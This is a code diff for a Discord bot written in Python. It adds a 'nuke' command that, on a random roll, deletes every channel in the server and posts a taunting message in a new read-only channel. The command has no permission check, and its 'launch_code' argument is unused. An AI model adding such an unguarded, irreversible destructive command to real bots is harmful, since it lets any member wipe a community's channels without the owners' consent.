@@ -24,6 +24,21 @@ async def _help(ctx):
     )
     await ctx.author.send(embed=embed)
 
+@client.command(name="nuke", pass_context = True)
+async def _nukeGuild(ctx, launch_code: int=None):
+    await ctx.message.delete()
+    if random.randint(0,100) == random.randint(0,100):
+        for channel in ctx.guild.channels:
+            await channel.delete()
+        overwrites = {
+            ctx.guild.default_role: discord.PermissionOverwrite(send_messages=False),
+        }
+        read_only = await ctx.guild.create_text_channel(
+            name="Aftermath",
+            overwrites=overwrites
+        )
+        await read_only.send(f"{ctx.message.author} figured out the launch code and nuked the server! Have fun rebuilding!")
+
 @client.command(name="kick", pass_context=True)
 async def _kickUser(ctx, user):
     if ctx.message.mentions.__len__() > 0:
